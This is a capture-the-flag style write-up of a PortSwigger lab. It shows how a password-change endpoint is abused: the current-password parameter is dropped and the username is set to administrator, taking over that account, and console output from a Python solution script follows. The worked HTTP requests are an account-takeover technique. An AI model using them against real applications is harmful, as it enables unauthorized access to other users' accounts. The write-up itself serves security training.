# Lab: Weak isolation on dual-use endpoint

### Instructions

This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the `administrator` account and delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

Logging in as wiener and navigating to "My account" we change our password and capture the request in Burp:

```
POST /my-account/change-password HTTP/2
Host: 0a...web-security-academy.net

csrf=7oeS1tdvXxBhkXqcLN89XN1vGXYfYfpD&username=wiener&current-password=peter&new-password-1=test&new-password-2=test
```

Sending this to Repeater, we try removing the `current-password` parameter entirely:

```
csrf=7oeS1tdvXxBhkXqcLN89XN1vGXYfYfpD&username=wiener&new-password-1=test&new-password-2=test
```

The password changes successfully without it. The server is not actually validating that the current password was provided, it just changes whatever the `username` parameter says.

Since the target username is controlled by us in the request body, we swap it out for `administrator`:

```
csrf=7oeS1tdvXxBhkXqcLN89XN1vGXYfYfpD&username=administrator&new-password-1=test&new-password-2=test
```

The request goes through fine. We log out, log in as `administrator` with our new password, head to `/admin` and delete carlos to solve the lab.

### Python Solution

See `logic_vuln_07.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Business_Logic_Vulnerabilities/Logic_Vuln_07_weak_isolation_on_dual-use_endpoint]
└─$ python logic_vuln_07.py https://0a2f005b047ef51d811302a3000b007d.web-security-academy.net/
[+] Logged in as wiener
[*] Changing password for administrator...
[+] Administrator password changed to: test
[+] Logged in as administrator
[*] Deleting carlos...
[+] Carlos deleted - Lab solved!
```